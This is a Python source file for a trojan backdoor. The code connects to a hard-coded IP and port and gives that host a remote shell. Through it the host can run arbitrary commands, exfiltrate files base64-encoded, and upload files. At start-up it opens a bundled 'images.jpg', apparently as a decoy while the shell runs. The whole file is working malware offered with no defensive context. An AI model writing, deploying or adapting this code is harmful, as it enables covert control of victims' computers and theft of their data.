import socket
import json
import subprocess
import os
import sys
import base64

class Backdoor(object):
    def __init__(self, ip, port):
        self.ip = ip
        self.port= port
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        while True:
            try:
                self.connection.connect((self.ip, self.port))
            except Exception:
                pass
            else:
                break
            

        
    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def execute_command(self,command):
        try:
            return subprocess.check_output(command,shell=True)
        except Exception:
            return "[-]Command Error!".encode()
            
    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to "+ path
    
    def read_file(self, path):
        with open(path,'rb') as file:
            return base64.b64encode(file.read())
                
    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def write_file(self, path,content):
        with open(path,'wb') as f:
            f.write(base64.b64decode(content))
            return "[+] Upload successful."
    
    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except Exception:
                continue

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command).decode()
            except Exception:
                command_result = "[-] Error during comand execution."

            self.reliable_send(command_result)


file_name = sys._MEIPASS + "\images.jpg"
subprocess.Popen(file_name,shell=True)

backdoor = Backdoor("192.168.46.237",4444)
backdoor.run()
